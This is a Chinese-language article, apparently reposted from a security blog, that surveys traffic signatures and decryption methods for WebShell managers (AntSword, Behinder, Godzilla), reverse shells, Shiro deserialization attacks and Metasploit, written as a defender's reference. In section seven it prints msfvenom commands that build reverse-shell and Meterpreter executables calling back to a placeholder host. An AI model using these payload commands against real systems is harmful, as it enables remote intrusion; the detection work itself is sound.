---
title: WebShell 流量特征分析及解密方法综述
url: https://mp.weixin.qq.com/s/kDB5spthG2VI8VPADnOFAA
source: Doonsec's feed
date: 2026-05-25
fetch_date: 2026-05-26T06:00:34.809983
---

# WebShell 流量特征分析及解密方法综述

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/34E6IkhMl2GfOlhyZCNyhw2FtaLicaiaOj3KXff8ia115meIjBWsuOAia5apxsGWnNSG3jiawHrGD1SfagG6fFyiaMXYk46A5uibWBnxuSzTWnOicXQ/0?wx_fmt=jpeg)

# WebShell 流量特征分析及解密方法综述

赛博生存指南

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

以下文章来源于执安观域
，作者无为而治

![](http://wx.qlogo.cn/mmhead/Ib5852jAybibsp9VKvibicpFFHFgFib2hNxibjVRpAKG7TJ5w9jClRibictKD248UYWh8Tls2mq5jCiaXib8/0)

**执安观域**
.

一个在网安路上的探索者，领域包含渗透测试和电子取证

#

> **摘要**：本文系统梳理了网络安全攻防实战中常见的 WebShell 工具（蚁剑、冰蝎、哥斯拉）及 C2 框架（Metasploit）的流量特征与解密方法，涵盖反弹 Shell、Shiro 反序列化等典型攻击场景。文章从协议层特征、加密机制、密钥协商逻辑及流量还原技术四个维度展开分析，旨在为安全运维人员提供可操作的流量检测与溯源思路。

---

## 一、引言

在网络安全攻防对抗中，攻击者常借助 WebShell 工具或 C2（Command and Control）框架对目标系统进行远程控制。这类工具的通信流量往往经过编码、加密或混淆处理，给网络层检测带来较大挑战。然而，不同工具在协议实现、加密逻辑及行为模式上存在可辨识的特征，使得基于流量分析的检测与溯源成为可能。

本文将从实际流量样本出发，对以下几类典型工具的流量特征进行系统性分析：

* • **WebShell 管理工具**：蚁剑（AntSword）、冰蝎（Behinder）、哥斯拉（Godzilla）
* • **远程控制框架**：Metasploit Framework（MSF）
* • **攻击场景**：反弹 Shell、Shiro 反序列化漏洞利用

---

## 二、蚁剑（AntSword）流量特征与解密

### 2.1 流量特征识别

蚁剑作为一款经典的 WebShell 管理工具，其通信流量中存在显著的标识性特征。在 PHP 环境下，蚁剑通过 `@ini_set` 函数修改运行配置，该字符串在请求体中以不同编码形式出现：

* • **Base64 编码形式**：`QGluaV9zZXQ`

* • **Chr 拼接形式**：`cHr(64).ChR(105)...`（大小写混用以规避简单字符串匹配）

* • **ROT13 编码形式**：`@vav_frg`

在实际流量中，请求参数的结构通常表现为：链接密码（如 `HQ`）对应一句话木马的连接密码，后续字段承载具体执行的系统命令。

### 2.2 流量解密方法

蚁剑的通信载荷通常采用 Base64 编码，但其编码过程前会附加由混淆函数生成的随机前缀字符。因此，解码时需要先去除前缀字符（通常为 2 位，但也可能为多位，需根据实际样本尝试）。

**示例解密流程**：

```
原始载荷：AkY2QgIi92YXIvd3d3L2h0bWwiO2lkO2VjaG8gZTEyNGJjO3B3ZDtlY2hvIDQzNTIz
去除前缀：Y2QgIi92YXIvd3d3L2h0bWwiO2lkO2VjaG8gZTEyNGJjO3B3ZDtlY2hvIDQzNTIz
Base64 解码：cd "/var/www/html";id;echo e124bc;pwd;echo 43523
```

对于文件上传操作，蚁剑会对文件内容进行十六进制编码传输，接收端还原时执行 hex 解码即可恢复原始文件。

![](https://mmbiz.qpic.cn/mmbiz_png/34E6IkhMl2FBXZ6cB8hJ9qSrJJh3bCKrQmrhedIXrT9FNwCiaG5yxzzw91OfKMPZAaDNbsU4s3k0GeaDHZ3NwkQdSb84h0FJZeBQ0suKwIx0/640?wx_fmt=png&from=appmsg)

---

## 三、反弹 Shell 流量特征分析

### 3.1 明文流量特征

反弹 Shell 的初始连接阶段在传输层表现为标准的 TCP 三次握手。在排除 DNS 等正常业务流量后，可通过以下步骤定位可疑会话：

1. 1. **IP 范围筛选**：根据资产清单或内网段过滤目标范围；
2. 2. **行为模式判断**：关注异常端口（如高位端口）发起的出站连接；
3. 3. **TCP 流追踪**：右键追踪 TCP Stream 查看明文交互内容。

![](https://mmbiz.qpic.cn/mmbiz_png/34E6IkhMl2EpJslmSpSZnfFBicSdMz6Psm6ncqZAUk3ypmpy2Y95BRVwatjbaWJFKUJs9ezgyNZse4bFia4hEVQR75BfGEJLwRibdDsBhFBzicY/640?wx_fmt=png&from=appmsg)

### 3.2 加密/混淆场景下的检测

部分工具（如冰蝎）集成的反弹 Shell 功能在交互过程中无直接回显，流量呈现加密状态。此时需先对加密流量进行解密，再从解密后的载荷中提取回连的 IP 地址与端口号信息。

---

## 四、冰蝎（Behinder）流量特征与解密

### 4.1 密钥协商机制（冰蝎 4.x）

冰蝎 4 在正式通信前存在一次密钥协商过程。攻击者通过 GET 或 POST 请求向服务器获取通信密钥：

* • 请求参数中，`bing_pass` 为连接密码；
* ![](https://mmbiz.qpic.cn/mmbiz_png/34E6IkhMl2GKapHtefia7nWtN7amNZ1G4iacgpDqnoJuicRND25kuib6ibBtVmGFfWIbfsYmSIdQkTNibMgDw5WPyk5KaGtEemMYib8MTMOdZJajXM/640?wx_fmt=png&from=appmsg)
* • 服务器返回的 16 位十六进制字符串（如 `b99f6a7b04741130`）即为本次会话的通信密钥。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/34E6IkhMl2H5cQunicgHzddm1eCHAaqAjLclJUXmMJgWPKHKaQUbwHK8rCnkC7qy0HdxDic3josfcic0utf6U8zQ0sQKoXuuhyaRacYuMH8JyM/640?wx_fmt=png&from=appmsg)

服务器端使用随机数 MD5 值的高 16 位作为密钥，并将其存储于会话的 `SESSIONID` 中返回给攻击者。

### 4.2 解密方法

获取 16 位密钥后，可使用专用工具（如蓝队工具箱）对加密流量进行解密。

若无法直接从流量中提取密钥，可尝试在 Web 目录中定位木马文件，反推连接密码。当木马文件位置未知时，可借助 D 盾等 WebShell 查杀工具进行扫描定位。

解密后的流量可清晰呈现执行的系统命令：

![](https://mmbiz.qpic.cn/mmbiz_png/34E6IkhMl2F0P5fxVgjk4olIRMkvklSrF01Ws3hU1PUtjDPjuicYn9iaMmBwc9SpFwFB8BIdhmxCcz2t4jUlw7QYKJpssbM1SrNprQE22fxkQ/640?wx_fmt=png&from=appmsg)

> **注意**：冰蝎 2.x 与 3.x 版本不存在上述密钥协商过程，其加密逻辑与 4.x 存在差异，分析时需结合版本特征进行区分。

---

## 五、Shiro 反序列化漏洞流量特征

### 5.1 密钥爆破阶段

Apache Shiro 框架的 rememberMe 功能在实现中存在反序列化漏洞（CVE-2016-4437 等）。攻击者首先需要爆破出正确的 AES 密钥，才能构造有效的恶意 Cookie。

流量层面的典型特征包括：

* • 大量携带 `rememberMe` Cookie 的请求；
* • 不同请求中 `rememberMe` 字段值发生变化（对应不同的密钥尝试）；

正常情况下，若密钥错误，服务器会返回 `rememberMe=deleteMe` 的 Set-Cookie 响应头。部分 CTF 题目或测试环境会对该标识进行替换。

当密钥爆破成功时，服务器不再返回 `Set-Cookie: rememberMe=deleteMe`，此状态变化可作为爆破成功的判定依据。

### 5.2 利用链爆破与回显

在获取正确密钥后，攻击者继续通过 Cookie 字段爆破可用的利用链（Gadget Chain）。失败时仍然返回 `Set-Cookie` 响应。解密成功后的流量内容通常呈现 Java 反序列化数据的典型结构。

---

## 六、哥斯拉（Godzilla）流量特征与解密

### 6.1 连接阶段特征

哥斯拉工具的连接建立过程在流量层面呈现以下可辨识特征：

* • **连接失败**：产生 2 个数据包；
* • **连接成功**：产生 3 个数据包；
* • **首包特征**：第一个请求总是发送大量数据，内容为工具的配置信息；该请求包中无 Cookie 字段，服务器响应包也无实质内容，但会生成一个 Session，后续请求将携带此 Session Cookie。

### 6.2 解密方法

哥斯拉支持多种加密算法（如 AES、XOR 等），解密时需依次尝试以下步骤：

1. 1. **填入连接密钥**：从配置信息或流量中提取；
2. 2. **尝试不同木马类型**：哥斯拉支持多种协议类型（PHP、JSP、ASP 等），需匹配正确的加密模式；
3. 3. **验证解密结果**：若能成功还原明文，则当前算法与密钥组合正确。

确认算法后，可直接使用对应算法（如 AES）对后续流量进行批量解密。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/34E6IkhMl2GGOxGU8uMBsBDf5kYXMhsgBeEiaT5h9Hsb8DC26YibrXF7WL1Tuslc8pZrR5sNCvNZ9VhT6fVVTxZlwkqy0YShnUdCSe8iarS6zE/640?wx_fmt=png&from=appmsg)

---

## 七、Metasploit Framework（MSF）流量特征

### 7.1 协议与明文特征

MSF 生成的 Payload 在通信协议选择上呈现多样性：

| 协议类型 | 典型场景 |
| --- | --- |
| TCP | 最常用，原始 Socket 连接 |
| UDP | 特定场景下的隐蔽通信 |
| HTTP/HTTPS | 反向 HTTP(S) 隧道，穿透防火墙 |

在早期版本或未启用加密传输的情况下，MSF 流量中会暴露以下特征字符串：

* • `"meterpreter"`：Meterpreter 会话的显著标识；
* • `"revshell"` / `"reverse_shell"`：反向 Shell 相关标识；
* • `"uuid"`：每个会话的唯一标识符；
* • `"request"` / `"response"`：内部通信控制字段。

Wireshark 过滤表达式示例：

```
frame contains "meterpreter"
```

![[Pasted image 20251127110610.png]]

### 7.2 Shell 模式（明文传输）

使用 `msfvenom` 生成标准反向 Shell 载荷时：

```
msfvenom -p windows/x64/shell/reverse_tcp lhost=<IP> lport=6666 -f exe -o shell.exe
```

正向绑定模式对应 payload 为 `windows/x64/shell/tcp_bind`。此类流量在传输层为明文 TCP，可通过追踪 TCP Stream 直接查看交互内容。

### 7.3 Meterpreter 模式（TCP 加密传输）

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=6667 -f exe -o meter.exe
```

Meterpreter 的 `reverse_tcp` 模式采用 TLS 协议对通信内容进行加密，流量层面呈现 TLS 握手及加密应用数据特征。

![](https://mmbiz.qpic.cn/mmbiz_png/34E6IkhMl2Fqqw8UMnXibIPY4Q9y9ibTqF7xSvg4ojyqGISiaPrtEYQf7ObibURmukVr93k7BL6x3DjsWic5oXU4tm252bsEvowaMBWI3ovozQew/640?wx_fmt=png&from=appmsg)

### 7.4 Meterpreter  HTTP 模式

```
msfvenom -p windows/meterpreter/reverse_http lhost=<IP> lport=6667 -f exe -o http.exe
```

该模式将通信封装于 HTTP 协议中，请求和响应均通过标准 HTTP 报文传输。其中一个重要的可辨识特征是载荷中通常包含 **MZ 标志头**（Windows 可执行文件的 DOS 头标识）。

![](https://mmbiz.qpic.cn/mmbiz_png/34E6IkhMl2G3fR3E5sM3R2309FZXkAPHiaKJhO0ZB2NkmtSiaQQT3Ca7sMbmk17w3VtxW3t89avkQ1qjSW7AvIsI4eBfoeZuGebXdmL0wZMP0/640?wx_fmt=png&from=appmsg)

### 7.5 Meterpreter  HTTPS 模式

反向 HTTPS 模式在 HTTP 封装的基础上增加 TLS 加密，流量层面呈现 HTTPS 通信特征，检测难度相对更高。

![](https://mmbiz.qpic.cn/mmbiz_png/34E6IkhMl2G5xicFW9LXRnsydcjWkCB3sAbkahot6ibMc32eJbicfMDvKtAxt98PSjHTTS1hZ0SZvTIGibTUpZxD7vt8NzVekw5iccUWsXicoF7ts/640?wx_fmt=png&from=appmsg)

---

## 八、总结与防护建议

### 8.1 流量特征对比总结

| 工具/场景 | 协议层 | 加密方式 | 显著特征 |
| --- | --- | --- | --- |
| 蚁剑 | HTTP/HTTPS | Base64 + 随机前缀 | `@ini_set` 多种编码形态 |
| 反弹 Shell | TCP | 明文/工具加密 | 三次握手后异常端口通信 |
| 冰蝎 4.x | HTTP/HTTPS | AES | 16 位密钥协商过程 |
| Shiro 反序列化 | HTTP | AES + Base64 | `rememberMe=deleteMe` 交互模式 |
| 哥斯拉 | HTTP/HTTPS | AES/XOR 等 | 首包大体积配置数据，3 包握手 |
| MSF Shell | TCP | 明文 | `meterpreter` /`revshell` 关键字 |
| MSF Meterpreter | TCP/HTTP/HTTPS | TLS | MZ 标志头，HTTP 封装 |

### 8.2 检测与防护建议

1. 1. **边界流量监控**：对出站连接进行异常端口和异常频率检测；
2. 2. **深度包检测（DPI）**：针对 HTTP 请求体中的编码特征（如 `@ini_set` 变形、大体积首包）部署特征规则；
3. 3. **终端行为关联**：结合 Web 访问日志与终端进程行为，定位 WebShell 落地文件；
4. 4. **漏洞治理**：及时更新 Shiro、WebLogic 等中间件补丁，消除反序列化漏洞入口。

---

> **结语**：流量分析是网络攻防中的重要技能，掌握各类工具的通信指纹与加密逻辑，能够在海量数据中快速定位威胁、还原攻击路径。希望本文的系统性梳理能为安全从业者的日常运维与应急响应工作提供参考。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/W8BrFJicfTaicbd7kn2cZBgNIaLlk75yrMSYaKQVkia524P5J7BoEBsYWI1XEWOXqDdmMcIzOYWZAiaTaqoSuvZXfg/0?wx_fmt=png)

赛博生存指南

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/W8BrFJicfTaicbd7kn2cZBgNIaLlk75yrMSYaKQVkia524P5J7BoEBsYWI1XEWOXqDdmMcIzOYWZAiaTaqoSuvZXfg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过